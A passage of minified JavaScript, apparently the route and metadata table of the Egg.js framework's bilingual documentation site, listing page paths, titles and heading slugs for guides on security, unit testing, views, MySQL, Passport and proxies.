\u7684\u9632\u8303",heading:"\u5b89\u5168\u5a01\u80c1-hpp-\u7684\u9632\u8303"},{depth:3,value:"\u62d3\u5c55\u9605\u8bfb",heading:"\u62d3\u5c55\u9605\u8bfb-1"},{depth:3,value:"\u5982\u4f55\u9632\u8303",heading:"\u5982\u4f55\u9632\u8303"},{depth:2,value:"\u4e2d\u95f4\u4eba\u653b\u51fb\u4e0e HTTP / HTTPS",heading:"\u4e2d\u95f4\u4eba\u653b\u51fb\u4e0e-http--https"},{depth:2,value:"\u5b89\u5168\u5a01\u80c1 SSRF \u7684\u9632\u8303",heading:"\u5b89\u5168\u5a01\u80c1-ssrf-\u7684\u9632\u8303"},{depth:3,value:"\u5982\u4f55\u9632\u8303",heading:"\u5982\u4f55\u9632\u8303-1"},{depth:4,value:"\u914d\u7f6e",heading:"\u914d\u7f6e"},{depth:2,value:"\u5176\u4ed6\u5b89\u5168\u5de5\u5177",heading:"\u5176\u4ed6\u5b89\u5168\u5de5\u5177"},{depth:3,value:"ctx.isSafeDomain(domain)",heading:"ctxissafedomaindomain"},{depth:3,value:"app.injectCsrf(str)",heading:"appinjectcsrfstr"},{depth:3,value:"app.injectNonce(str)",heading:"appinjectnoncestr"},{depth:3,value:"app.injectHijackingDefense(str)",heading:"appinjecthijackingdefensestr"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"\u5b89\u5168 - Egg"},{path:"/core/unittest",component:n("nLQS").default,exact:!0,meta:{filePath:"site/docs/core/unittest.md",updatedTime:1687656833e3,title:"Unit Testing",order:2,slugs:[{depth:2,value:"Why Unit Testing",heading:"why-unit-testing"},{depth:2,value:"Test Framework",heading:"test-framework"},{depth:3,value:"Mocha",heading:"mocha"},{depth:3,value:"AVA",heading:"ava"},{depth:2,value:"Assertion Library",heading:"assertion-library"},{depth:2,value:"Test Rule",heading:"test-rule"},{depth:3,value:"Directory Structure",heading:"directory-structure"},{depth:3,value:"Test Tool",heading:"test-tool"},{depth:2,value:"Test Preparation",heading:"test-preparation"},{depth:3,value:"mock",heading:"mock"},{depth:3,value:"app",heading:"app"},{depth:3,value:"ctx",heading:"ctx"},{depth:2,value:"Testing Order",heading:"testing-order"},{depth:2,value:"Asynchronous Test",heading:"asynchronous-test"},{depth:2,value:"Controller Test",heading:"controller-test"},{depth:3,value:"mock CSRF",heading:"mock-csrf"},{depth:2,value:"Service Test",heading:"service-test"},{depth:2,value:"Extend Test",heading:"extend-test"},{depth:3,value:"Application",heading:"application"},{depth:3,value:"Context",heading:"context"},{depth:3,value:"Request",heading:"request"},{depth:3,value:"Response",heading:"response"},{depth:3,value:"Helper",heading:"helper"},{depth:2,value:"Mock Function",heading:"mock-function"},{depth:3,value:"Mock Properties And Functions",heading:"mock-properties-and-functions"},{depth:4,value:"Mock Properties",heading:"mock-properties"},{depth:4,value:"Mock Functions",heading:"mock-functions"},{depth:3,value:"Mock Service",heading:"mock-service"},{depth:3,value:"Mock HttpClient",heading:"mock-httpclient"},{depth:2,value:"Sample Code",heading:"sample-code"}],nav:{path:"/core",title:"Core"}},title:"Unit Testing - Egg"},{path:"/zh-CN/core/unittest",component:n("gkrA").default,exact:!0,meta:{filePath:"site/docs/core/unittest.zh-CN.md",updatedTime:1687656833e3,title:"\u5355\u5143\u6d4b\u8bd5",order:2,slugs:[{depth:2,value:"\u4e3a\u4ec0\u4e48\u8981\u5355\u5143\u6d4b\u8bd5",heading:"\u4e3a\u4ec0\u4e48\u8981\u5355\u5143\u6d4b\u8bd5"},{depth:2,value:"\u6d4b\u8bd5\u6846\u67b6",heading:"\u6d4b\u8bd5\u6846\u67b6"},{depth:3,value:"Mocha",heading:"mocha"},{depth:3,value:"AVA",heading:"ava"},{depth:2,value:"\u65ad\u8a00\u5e93",heading:"\u65ad\u8a00\u5e93"},{depth:2,value:"\u6d4b\u8bd5\u7ea6\u5b9a",heading:"\u6d4b\u8bd5\u7ea6\u5b9a"},{depth:3,value:"\u6d4b\u8bd5\u76ee\u5f55\u7ed3\u6784",heading:"\u6d4b\u8bd5\u76ee\u5f55\u7ed3\u6784"},{depth:3,value:"\u6d4b\u8bd5\u8fd0\u884c\u5de5\u5177",heading:"\u6d4b\u8bd5\u8fd0\u884c\u5de5\u5177"},{depth:2,value:"\u51c6\u5907\u6d4b\u8bd5",heading:"\u51c6\u5907\u6d4b\u8bd5"},{depth:3,value:"mock",heading:"mock"},{depth:3,value:"app",heading:"app"},{depth:3,value:"ctx",heading:"ctx"},{depth:2,value:"\u6d4b\u8bd5\u6267\u884c\u987a\u5e8f",heading:"\u6d4b\u8bd5\u6267\u884c\u987a\u5e8f"},{depth:2,value:"\u5f02\u6b65\u6d4b\u8bd5",heading:"\u5f02\u6b65\u6d4b\u8bd5"},{depth:2,value:"Controller \u6d4b\u8bd5",heading:"controller-\u6d4b\u8bd5"},{depth:3,value:"mock CSRF",heading:"mock-csrf"},{depth:2,value:"Service \u6d4b\u8bd5",heading:"service-\u6d4b\u8bd5"},{depth:2,value:"Extend \u6d4b\u8bd5",heading:"extend-\u6d4b\u8bd5"},{depth:3,value:"Application",heading:"application"},{depth:3,value:"Context",heading:"context"},{depth:3,value:"Request",heading:"request"},{depth:3,value:"Response",heading:"response"},{depth:3,value:"Helper",heading:"helper"},{depth:2,value:"Mock \u65b9\u6cd5",heading:"mock-\u65b9\u6cd5"},{depth:3,value:"Mock \u5c5e\u6027\u548c\u65b9\u6cd5",heading:"mock-\u5c5e\u6027\u548c\u65b9\u6cd5"},{depth:4,value:"Mock \u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027",heading:"mock-\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027"},{depth:4,value:"Mock \u4e00\u4e2a\u5bf9\u8c61\u7684\u65b9\u6cd5",heading:"mock-\u4e00\u4e2a\u5bf9\u8c61\u7684\u65b9\u6cd5"},{depth:3,value:"Mock Service",heading:"mock-service"},{depth:3,value:"Mock HttpClient",heading:"mock-httpclient"},{depth:2,value:"\u793a\u4f8b\u4ee3\u7801",heading:"\u793a\u4f8b\u4ee3\u7801"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"\u5355\u5143\u6d4b\u8bd5 - Egg"},{path:"/core/view",component:n("ajGA").default,exact:!0,meta:{filePath:"site/docs/core/view.md",updatedTime:1687656833e3,title:"View Template Rendering",order:8,slugs:[{depth:3,value:"Installing View Engine Plugin",heading:"installing-view-engine-plugin"},{depth:3,value:"Enabling View Engine Plugin",heading:"enabling-view-engine-plugin"},{depth:2,value:"Configuring View Plugins",heading:"configuring-view-plugins"},{depth:3,value:"root {String}",heading:"root-string"},{depth:3,value:"cache {Boolean}",heading:"cache-boolean"},{depth:3,value:"mapping and defaultViewEngine",heading:"mapping-and-defaultviewengine"},{depth:3,value:"defaultExtension",heading:"defaultextension"},{depth:2,value:"Rendering Page",heading:"rendering-page"},{depth:2,value:"locals",heading:"locals"},{depth:2,value:"Helper",heading:"helper"},{depth:2,value:"Security",heading:"security"}],nav:{path:"/core",title:"Core"}},title:"View Template Rendering - Egg"},{path:"/zh-CN/core/view",component:n("/3Ig").default,exact:!0,meta:{filePath:"site/docs/core/view.zh-CN.md",updatedTime:1687656833e3,title:"View \u6a21\u677f\u6e32\u67d3",order:8,slugs:[{depth:2,value:"\u5f15\u5165 view \u63d2\u4ef6",heading:"\u5f15\u5165-view-\u63d2\u4ef6"},{depth:3,value:"\u542f\u7528\u63d2\u4ef6",heading:"\u542f\u7528\u63d2\u4ef6"},{depth:2,value:"\u914d\u7f6e\u63d2\u4ef6",heading:"\u914d\u7f6e\u63d2\u4ef6"},{depth:3,value:"root {String}",heading:"root-string"},{depth:3,value:"cache {Boolean}",heading:"cache-boolean"},{depth:3,value:"mapping \u548c defaultViewEngine",heading:"mapping-\u548c-defaultviewengine"},{depth:3,value:"defaultExtension",heading:"defaultextension"},{depth:2,value:"\u6e32\u67d3\u9875\u9762",heading:"\u6e32\u67d3\u9875\u9762"},{depth:2,value:"Locals",heading:"locals"},{depth:2,value:"Helper",heading:"helper"},{depth:2,value:"Security",heading:"security"}],locale:"zh-CN",nav:{path:"/zh-CN/core",title:"\u6838\u5fc3\u529f\u80fd"}},title:"View \u6a21\u677f\u6e32\u67d3 - Egg"},{path:"/intro/egg-and-koa",component:n("X9zN").default,exact:!0,meta:{filePath:"site/docs/intro/egg-and-koa.md",updatedTime:1687656833e3,title:"Egg and Koa",order:1,slugs:[{depth:2,value:"Asynchronous Programming Model",heading:"asynchronous-programming-model"},{depth:3,value:"Async Function",heading:"async-function"},{depth:2,value:"Koa",heading:"koa"},{depth:3,value:"Midlleware",heading:"midlleware"},{depth:3,value:"Context",heading:"context"},{depth:3,value:"Exception Handling",heading:"exception-handling"},{depth:2,value:"Egg Inherits from Koa",heading:"egg-inherits-from-koa"},{depth:3,value:"Extension",heading:"extension"},{depth:3,value:"Plugin",heading:"plugin"},{depth:3,value:"Roadmap",heading:"roadmap"},{depth:4,value:"Egg 1.x",heading:"egg-1x"},{depth:4,value:"Egg 2.x",heading:"egg-2x"}],nav:{path:"/intro",title:"Intro"}},title:"Egg and Koa - Egg"},{path:"/zh-CN/intro/egg-and-koa",component:n("8zzq").default,exact:!0,meta:{filePath:"site/docs/intro/egg-and-koa.zh-CN.md",updatedTime:1687656833e3,title:"Egg.js \u4e0e Koa",order:1,slugs:[{depth:2,value:"\u5f02\u6b65\u7f16\u7a0b\u6a21\u578b",heading:"\u5f02\u6b65\u7f16\u7a0b\u6a21\u578b"},{depth:3,value:"async function",heading:"async-function"},{depth:2,value:"Koa",heading:"koa"},{depth:3,value:"Middleware",heading:"middleware"},{depth:3,value:"Context",heading:"context"},{depth:3,value:"\u5f02\u5e38\u5904\u7406",heading:"\u5f02\u5e38\u5904\u7406"},{depth:2,value:"Egg \u7ee7\u627f\u4e8e Koa",heading:"egg-\u7ee7\u627f\u4e8e-koa"},{depth:3,value:"\u6269\u5c55",heading:"\u6269\u5c55"},{depth:3,value:"\u63d2\u4ef6",heading:"\u63d2\u4ef6"},{depth:3,value:"Egg \u4e0e Koa \u7684\u7248\u672c\u5173\u7cfb",heading:"egg-\u4e0e-koa-\u7684\u7248\u672c\u5173\u7cfb"},{depth:4,value:"Egg 1.x",heading:"egg-1x"},{depth:4,value:"Egg 2.x",heading:"egg-2x"}],locale:"zh-CN",nav:{path:"/zh-CN/intro",title:"\u6307\u5357"}},title:"Egg.js \u4e0e Koa - Egg"},{path:"/intro",component:n("gbrS").default,exact:!0,meta:{filePath:"site/docs/intro/index.md",updatedTime:1687656833e3,title:"What is Egg?",order:0,nav:{title:"Intro",order:1,path:"/intro"},slugs:[{depth:2,value:"Design principles",heading:"design-principles"},{depth:2,value:"Differences Between Community Framework",heading:"differences-between-community-framework"},{depth:2,value:"Features",heading:"features"}]},title:"What is Egg? - Egg"},{path:"/zh-CN/intro",component:n("+p3P").default,exact:!0,meta:{filePath:"site/docs/intro/index.zh-CN.md",updatedTime:1687656833e3,title:"Egg.js \u662f\u4ec0\u4e48?",order:0,nav:{title:"\u6307\u5357",order:1,path:"/zh-CN/intro"},slugs:[{depth:2,value:"\u8bbe\u8ba1\u539f\u5219",heading:"\u8bbe\u8ba1\u539f\u5219"},{depth:2,value:"\u4e0e\u793e\u533a\u6846\u67b6\u7684\u5dee\u5f02",heading:"\u4e0e\u793e\u533a\u6846\u67b6\u7684\u5dee\u5f02"},{depth:2,value:"\u7279\u6027",heading:"\u7279\u6027"}],locale:"zh-CN"},title:"Egg.js \u662f\u4ec0\u4e48? - Egg"},{path:"/intro/migration",component:n("rKDE").default,exact:!0,meta:{filePath:"site/docs/intro/migration.md",updatedTime:1687656833e3,title:"Egg@2 Upgrade guideline",order:4,slugs:[{depth:2,value:"Background",heading:"background"},{depth:2,value:"Quick upgrade",heading:"quick-upgrade"},{depth:2,value:"Plugin update",heading:"plugin-update"},{depth:3,value:"egg-multipart",heading:"egg-multipart"},{depth:3,value:"egg-userrole",heading:"egg-userrole"},{depth:2,value:"Further upgrade",heading:"further-upgrade"},{depth:3,value:"Use Koa2-styled middleware",heading:"use-koa2-styled-middleware"},{depth:3,value:"yieldable to awaitable",heading:"yieldable-to-awaitable"},{depth:4,value:"promise",heading:"promise"},{depth:4,value:"array - yield []",heading:"array---yield-"},{depth:4,value:"object - yield {}",heading:"object---yield-"},{depth:4,value:"Others",heading:"others"},{depth:2,value:"Plugin update",heading:"plugin-update-1"},{depth:3,value:"Update precautions",heading:"update-precautions"},{depth:3,value:"Interfaces compatibility",heading:"interfaces-compatibility"},{depth:3,value:"Rules of Plugin release",heading:"rules-of-plugin-release"}],nav:{path:"/intro",title:"Intro"}},title:"Egg@2 Upgrade guideline - Egg"},{path:"/zh-CN/intro/migration",component:n("MlNl").default,exact:!0,meta:{filePath:"site/docs/intro/migration.zh-CN.md",updatedTime:1687656833e3,title:"Egg@2 \u5347\u7ea7\u6307\u5357",order:4,slugs:[{depth:2,value:"\u80cc\u666f",heading:"\u80cc\u666f"},{depth:2,value:"\u5feb\u901f\u5347\u7ea7",heading:"\u5feb\u901f\u5347\u7ea7"},{depth:2,value:"\u63d2\u4ef6\u53d8\u66f4\u8bf4\u660e",heading:"\u63d2\u4ef6\u53d8\u66f4\u8bf4\u660e"},{depth:3,value:"egg-multipart",heading:"egg-multipart"},{depth:3,value:"egg-userrole",heading:"egg-userrole"},{depth:2,value:"\u8fdb\u4e00\u6b65\u5347\u7ea7",heading:"\u8fdb\u4e00\u6b65\u5347\u7ea7"},{depth:3,value:"\u4e2d\u95f4\u4ef6\u4f7f\u7528 Koa2 \u98ce\u683c",heading:"\u4e2d\u95f4\u4ef6\u4f7f\u7528-koa2-\u98ce\u683c"},{depth:3,value:"yieldable to awaitable",heading:"yieldable-to-awaitable"},{depth:4,value:"promise",heading:"promise"},{depth:4,value:"array - yield []",heading:"array---yield-"},{depth:4,value:"object - yield {}",heading:"object---yield-"},{depth:4,value:"\u5176\u4ed6",heading:"\u5176\u4ed6"},{depth:2,value:"\u63d2\u4ef6\u5347\u7ea7",heading:"\u63d2\u4ef6\u5347\u7ea7"},{depth:3,value:"\u5347\u7ea7\u4e8b\u9879",heading:"\u5347\u7ea7\u4e8b\u9879"},{depth:3,value:"\u63a5\u53e3\u517c\u5bb9",heading:"\u63a5\u53e3\u517c\u5bb9"},{depth:3,value:"\u63d2\u4ef6\u53d1\u5e03\u89c4\u5219",heading:"\u63d2\u4ef6\u53d1\u5e03\u89c4\u5219"}],locale:"zh-CN",nav:{path:"/zh-CN/intro",title:"\u6307\u5357"}},title:"Egg@2 \u5347\u7ea7\u6307\u5357 - Egg"},{path:"/intro/progressive",component:n("KXzQ").default,exact:!0,meta:{filePath:"site/docs/intro/progressive.md",updatedTime:1687656833e3,title:"Progressive Development",order:3,slugs:[{depth:2,value:"Getting Started",heading:"getting-started"},{depth:2,value:"Prototype of Plugin",heading:"prototype-of-plugin"},{depth:2,value:"Extract to Independent Plugin",heading:"extract-to-independent-plugin"},{depth:2,value:"Finally: A Framework",heading:"finally-a-framework"},{depth:2,value:"In the End",heading:"in-the-end"}],nav:{path:"/intro",title:"Intro"}},title:"Progressive Development - Egg"},{path:"/zh-CN/intro/progressive",component:n("xv++").default,exact:!0,meta:{filePath:"site/docs/intro/progressive.zh-CN.md",updatedTime:1687656833e3,title:"\u6e10\u8fdb\u5f0f\u5f00\u53d1",order:3,slugs:[{depth:2,value:"\u6700\u521d\u59cb\u7684\u72b6\u6001",heading:"\u6700\u521d\u59cb\u7684\u72b6\u6001"},{depth:2,value:"\u63d2\u4ef6\u7684\u96cf\u5f62",heading:"\u63d2\u4ef6\u7684\u96cf\u5f62"},{depth:2,value:"\u62bd\u6210\u72ec\u7acb\u63d2\u4ef6",heading:"\u62bd\u6210\u72ec\u7acb\u63d2\u4ef6"},{depth:2,value:"\u6c89\u6dc0\u5230\u6846\u67b6",heading:"\u6c89\u6dc0\u5230\u6846\u67b6"},{depth:2,value:"\u5199\u5728\u6700\u540e",heading:"\u5199\u5728\u6700\u540e"}],locale:"zh-CN",nav:{path:"/zh-CN/intro",title:"\u6307\u5357"}},title:"\u6e10\u8fdb\u5f0f\u5f00\u53d1 - Egg"},{path:"/intro/quickstart",component:n("be/u").default,exact:!0,meta:{filePath:"site/docs/intro/quickstart.md",updatedTime:1687656833e3,title:"Quick Start",order:2,slugs:[{depth:2,value:"Prerequisites",heading:"prerequisites"},{depth:2,value:"The Quick Way",heading:"the-quick-way"},{depth:2,value:"Step by Step",heading:"step-by-step"},{depth:3,value:"Initialization",heading:"initialization"},{depth:3,value:"Create a Controller",heading:"create-a-controller"},{depth:3,value:"Adding Static Assets",heading:"adding-static-assets"},{depth:3,value:"Adding Templates for Rendering",heading:"adding-templates-for-rendering"},{depth:3,value:"Create a Service",heading:"create-a-service"},{depth:3,value:"Adding Extensions",heading:"adding-extensions"},{depth:3,value:"Adding Middlewares",heading:"adding-middlewares"},{depth:3,value:"Adding Configurations",heading:"adding-configurations"},{depth:3,value:"Adding Unit Testing",heading:"adding-unit-testing"},{depth:2,value:"Conclusions",heading:"conclusions"}],nav:{path:"/intro",title:"Intro"}},title:"Quick Start - Egg"},{path:"/zh-CN/intro/quickstart",component:n("KLR4").default,exact:!0,meta:{filePath:"site/docs/intro/quickstart.zh-CN.md",updatedTime:1687656833e3,title:"\u5feb\u901f\u5165\u95e8",order:2,slugs:[{depth:2,value:"\u73af\u5883\u51c6\u5907",heading:"\u73af\u5883\u51c6\u5907"},{depth:2,value:"\u5feb\u901f\u521d\u59cb\u5316",heading:"\u5feb\u901f\u521d\u59cb\u5316"},{depth:2,value:"\u9010\u6b65\u642d\u5efa",heading:"\u9010\u6b65\u642d\u5efa"},{depth:3,value:"\u521d\u59cb\u5316\u9879\u76ee",heading:"\u521d\u59cb\u5316\u9879\u76ee"},{depth:3,value:"\u7f16\u5199 Controller",heading:"\u7f16\u5199-controller"},{depth:3,value:"\u9759\u6001\u8d44\u6e90",heading:"\u9759\u6001\u8d44\u6e90"},{depth:3,value:"\u6a21\u677f\u6e32\u67d3",heading:"\u6a21\u677f\u6e32\u67d3"},{depth:3,value:"\u7f16\u5199 service",heading:"\u7f16\u5199-service"},{depth:3,value:"\u7f16\u5199\u6269\u5c55",heading:"\u7f16\u5199\u6269\u5c55"},{depth:3,value:"\u7f16\u5199 Middleware",heading:"\u7f16\u5199-middleware"},{depth:3,value:"\u914d\u7f6e\u6587\u4ef6",heading:"\u914d\u7f6e\u6587\u4ef6"},{depth:3,value:"\u5355\u5143\u6d4b\u8bd5",heading:"\u5355\u5143\u6d4b\u8bd5"},{depth:2,value:"\u540e\u8bb0",heading:"\u540e\u8bb0"}],locale:"zh-CN",nav:{path:"/zh-CN/intro",title:"\u6307\u5357"}},title:"\u5feb\u901f\u5165\u95e8 - Egg"},{path:"/tutorials/assets",component:n("OwS2").default,exact:!0,meta:{filePath:"site/docs/tutorials/assets.md",updatedTime:1687656833e3,title:"Assets",slugs:[],nav:{path:"/tutorials",title:"Tutorials"}},title:"Assets - Egg"},{path:"/zh-CN/tutorials/assets",component:n("tqSL").default,exact:!0,meta:{filePath:"site/docs/tutorials/assets.zh-CN.md",updatedTime:1687656833e3,title:"\u9759\u6001\u8d44\u6e90",slugs:[{depth:2,value:"\u9875\u9762\u6e32\u67d3",heading:"\u9875\u9762\u6e32\u67d3"},{depth:3,value:"\u4f7f\u7528 assets \u6a21\u677f\u5f15\u64ce",heading:"\u4f7f\u7528-assets-\u6a21\u677f\u5f15\u64ce"},{depth:4,value:"\u5168\u5c40\u81ea\u5b9a\u4e49 html \u6a21\u677f",heading:"\u5168\u5c40\u81ea\u5b9a\u4e49-html-\u6a21\u677f"},{depth:4,value:"\u9875\u9762\u81ea\u5b9a\u4e49 html \u6a21\u677f",heading:"\u9875\u9762\u81ea\u5b9a\u4e49-html-\u6a21\u677f"},{depth:4,value:"\u4fee\u6539\u9759\u6001\u8d44\u6e90\u76ee\u5f55",heading:"\u4fee\u6539\u9759\u6001\u8d44\u6e90\u76ee\u5f55"},{depth:3,value:"\u4f7f\u7528\u5176\u4ed6\u6a21\u677f\u5f15\u64ce",heading:"\u4f7f\u7528\u5176\u4ed6\u6a21\u677f\u5f15\u64ce"},{depth:3,value:"\u4e0a\u4e0b\u6587\u6570\u636e",heading:"\u4e0a\u4e0b\u6587\u6570\u636e"},{depth:2,value:"\u6784\u5efa\u5de5\u5177",heading:"\u6784\u5efa\u5de5\u5177"},{depth:3,value:"\u6620\u5c04\u5173\u7cfb",heading:"\u6620\u5c04\u5173\u7cfb"},{depth:3,value:"\u672c\u5730\u5f00\u53d1",heading:"\u672c\u5730\u5f00\u53d1"},{depth:3,value:"\u90e8\u7f72",heading:"\u90e8\u7f72"},{depth:4,value:"\u5e94\u7528\u63d0\u4f9b\u670d\u52a1",heading:"\u5e94\u7528\u63d0\u4f9b\u670d\u52a1"},{depth:4,value:"\u4f7f\u7528 CDN",heading:"\u4f7f\u7528-cdn"}],locale:"zh-CN",nav:{path:"/zh-CN/tutorials",title:"\u6559\u7a0b"}},title:"\u9759\u6001\u8d44\u6e90 - Egg"},{path:"/tutorials",component:n("f3yK").default,exact:!0,meta:{filePath:"site/docs/tutorials/index.md",updatedTime:1687656833e3,title:"Tutorials",nav:{title:"Tutorials",order:2,path:"/tutorials"},slugs:[{depth:2,value:"Boilerplate Type Description",heading:"boilerplate-type-description"},{depth:3,value:"Options",heading:"options"},{depth:2,value:"Template Engines",heading:"template-engines"},{depth:2,value:"Databases",heading:"databases"}]},title:"Tutorials - Egg"},{path:"/zh-CN/tutorials",component:n("3+p+").default,exact:!0,meta:{filePath:"site/docs/tutorials/index.zh-CN.md",updatedTime:1687656833e3,title:"\u6559\u7a0b",nav:{title:"\u6559\u7a0b",order:2,path:"/zh-CN/tutorials"},slugs:[{depth:2,value:"\u9aa8\u67b6\u7c7b\u578b\u8bf4\u660e",heading:"\u9aa8\u67b6\u7c7b\u578b\u8bf4\u660e"},{depth:3,value:"\u9009\u9879",heading:"\u9009\u9879"},{depth:2,value:"\u6a21\u677f\u5f15\u64ce",heading:"\u6a21\u677f\u5f15\u64ce"},{depth:2,value:"\u6570\u636e\u5e93",heading:"\u6570\u636e\u5e93"}],locale:"zh-CN"},title:"\u6559\u7a0b - Egg"},{path:"/tutorials/mysql",component:n("O8iV").default,exact:!0,meta:{filePath:"site/docs/tutorials/mysql.md",updatedTime:1687656833e3,title:"MySQL",slugs:[{depth:2,value:"egg-mysql",heading:"egg-mysql"},{depth:3,value:"Installation and Configuration",heading:"installation-and-configuration"},{depth:4,value:"Single Data Source",heading:"single-data-source"},{depth:4,value:"Multiple Data Sources",heading:"multiple-data-sources"},{depth:4,value:"Dynamic Creation",heading:"dynamic-creation"},{depth:2,value:"Service Layer",heading:"service-layer"},{depth:2,value:"Writing CRUD",heading:"writing-crud"},{depth:3,value:"Create",heading:"create"},{depth:3,value:"Read",heading:"read"},{depth:3,value:"Update",heading:"update"},{depth:3,value:"Delete",heading:"delete"},{depth:2,value:"Implementation of SQL statement",heading:"implementation-of-sql-statement"},{depth:2,value:"Transaction",heading:"transaction"},{depth:3,value:"Manual Control",heading:"manual-control"},{depth:3,value:"Automatic Control: Transaction with Scope",heading:"automatic-control-transaction-with-scope"},{depth:2,value:"Literal",heading:"literal"},{depth:3,value:"Inner Literal",heading:"inner-literal"},{depth:3,value:"Custom literal",heading:"custom-literal"}],nav:{path:"/tutorials",title:"Tutorials"}},title:"MySQL - Egg"},{path:"/zh-CN/tutorials/mysql",component:n("y18q").default,exact:!0,meta:{filePath:"site/docs/tutorials/mysql.zh-CN.md",updatedTime:1687656833e3,title:"MySQL",slugs:[{depth:2,value:"egg-mysql",heading:"egg-mysql"},{depth:3,value:"\u5b89\u88c5\u4e0e\u914d\u7f6e",heading:"\u5b89\u88c5\u4e0e\u914d\u7f6e"},{depth:4,value:"\u5355\u6570\u636e\u6e90",heading:"\u5355\u6570\u636e\u6e90"},{depth:4,value:"\u591a\u6570\u636e\u6e90",heading:"\u591a\u6570\u636e\u6e90"},{depth:4,value:"\u52a8\u6001\u521b\u5efa",heading:"\u52a8\u6001\u521b\u5efa"},{depth:2,value:"Service \u5c42",heading:"service-\u5c42"},{depth:2,value:"\u5982\u4f55\u7f16\u5199 CRUD \u8bed\u53e5",heading:"\u5982\u4f55\u7f16\u5199-crud-\u8bed\u53e5"},{depth:3,value:"Create",heading:"create"},{depth:3,value:"Read",heading:"read"},{depth:3,value:"Update",heading:"update"},{depth:3,value:"Delete",heading:"delete"},{depth:2,value:"\u76f4\u63a5\u6267\u884c sql \u8bed\u53e5",heading:"\u76f4\u63a5\u6267\u884c-sql-\u8bed\u53e5"},{depth:2,value:"\u4f7f\u7528\u4e8b\u52a1",heading:"\u4f7f\u7528\u4e8b\u52a1"},{depth:3,value:"\u624b\u52a8\u63a7\u5236",heading:"\u624b\u52a8\u63a7\u5236"},{depth:3,value:"\u81ea\u52a8\u63a7\u5236\uff1aTransaction with scope",heading:"\u81ea\u52a8\u63a7\u5236transaction-with-scope"},{depth:2,value:"\u8868\u8fbe\u5f0f(Literal)",heading:"\u8868\u8fbe\u5f0fliteral"},{depth:3,value:"\u5185\u7f6e\u8868\u8fbe\u5f0f",heading:"\u5185\u7f6e\u8868\u8fbe\u5f0f"},{depth:3,value:"\u81ea\u5b9a\u4e49\u8868\u8fbe\u5f0f",heading:"\u81ea\u5b9a\u4e49\u8868\u8fbe\u5f0f"}],locale:"zh-CN",nav:{path:"/zh-CN/tutorials",title:"\u6559\u7a0b"}},title:"MySQL - Egg"},{path:"/tutorials/passport",component:n("+ONy").default,exact:!0,meta:{filePath:"site/docs/tutorials/passport.md",updatedTime:1687656833e3,title:"Passport",slugs:[{depth:2,value:"Using egg-passport",heading:"using-egg-passport"},{depth:3,value:"Installation",heading:"installation"},{depth:3,value:"Configuration",heading:"configuration"},{depth:3,value:"Mounting Routes",heading:"mounting-routes"},{depth:3,value:"User Information Processing",heading:"user-information-processing"},{depth:3,value:"API",heading:"api"},{depth:2,value:"Using Passport Ecosystem",heading:"using-passport-ecosystem"},{depth:3,value:"Installation",heading:"installation-1"},{depth:3,value:"Configuration",heading:"configuration-1"},{depth:3,value:"Mounting Routes",heading:"mounting-routes-1"},{depth:2,value:"How to develop an egg-passport plugin",heading:"how-to-develop-an-egg-passport-plugin"}],nav:{path:"/tutorials",title:"Tutorials"}},title:"Passport - Egg"},{path:"/zh-CN/tutorials/passport",component:n("vFOa").default,exact:!0,meta:{filePath:"site/docs/tutorials/passport.zh-CN.md",updatedTime:1687656833e3,title:"Passport",slugs:[{depth:2,value:"\u4f7f\u7528 egg-passport",heading:"\u4f7f\u7528-egg-passport"},{depth:3,value:"\u5b89\u88c5",heading:"\u5b89\u88c5"},{depth:3,value:"\u914d\u7f6e",heading:"\u914d\u7f6e"},{depth:3,value:"\u6302\u8f7d\u8def\u7531",heading:"\u6302\u8f7d\u8def\u7531"},{depth:3,value:"\u7528\u6237\u4fe1\u606f\u5904\u7406",heading:"\u7528\u6237\u4fe1\u606f\u5904\u7406"},{depth:3,value:"API",heading:"api"},{depth:2,value:"\u4f7f\u7528 Passport \u751f\u6001",heading:"\u4f7f\u7528-passport-\u751f\u6001"},{depth:3,value:"\u5b89\u88c5",heading:"\u5b89\u88c5-1"},{depth:3,value:"\u914d\u7f6e",heading:"\u914d\u7f6e-1"},{depth:3,value:"\u6302\u8f7d\u8def\u7531",heading:"\u6302\u8f7d\u8def\u7531-1"},{depth:2,value:"\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a egg-passport \u63d2\u4ef6",heading:"\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a-egg-passport-\u63d2\u4ef6"}],locale:"zh-CN",nav:{path:"/zh-CN/tutorials",title:"\u6559\u7a0b"}},title:"Passport - Egg"},{path:"/tutorials/proxy",component:n("jA+a").default,exact:!0,meta:{filePath:"site/docs/tutorials/proxy.md",updatedTime:1687656833e3,title:"Behind a Proxy",slugs:[{depth:2,value:"Enable Proxy Mode",heading:"enable-proxy-mode"},{depth:3,value:"config.ipHeaders",heading:"configipheaders"},{depth:3,value:"config.maxIpsCount",heading:"configmaxipscount"},{depth:3,value:"config.protocolHeaders",heading:"configprotocolheaders"},{depth:3,value:"config.hostHeaders",heading:"confighostheaders"}],nav:{path:"/tutorials",title:"Tutorials"}},title:"Behind a Proxy - Egg"},{path:"/zh-CN/tutorials/proxy",component:n("upeu").default,exact:!0,meta:{filePath:"site/docs/tutorials/proxy.zh-CN.md",updatedTime:1687656833e3,title:"\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f",slugs:[{depth:2,value:"\u5f00\u542f\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f",heading:"\u5f00\u542f\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f"},{depth:3,value:"config.ipHeaders",heading:"configipheaders"},{depth:3,value:"config.maxIpsCount",heading:"configmaxipscount"},{depth:3,value:"config.protocolHeaders",heading:"configprotocolheaders"},{depth:3,value:"config.hostHeaders",heading:"confighostheaders"}],locale:"zh-CN",nav:{path:"/zh-CN/tutorials",title:"\u6559\u7a0b"}},title:"\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f - Egg"},{path:"/tutorials/restful",component:n("B99X").default,exact:!0,meta:{filePath:"site/docs/tutorials/restful.md",updatedTime:1687656833e3,title:"Build RESTful API",slugs:[{depth:2,value:"Response Formatting",heading:"response-formatting"},{depth:3,value:"Get topics list",heading:"get-topics-list"},{depth:3,value:"Retrieve One Topic",heading:"retrieve-one-topic"},{depth:3,value:"Create 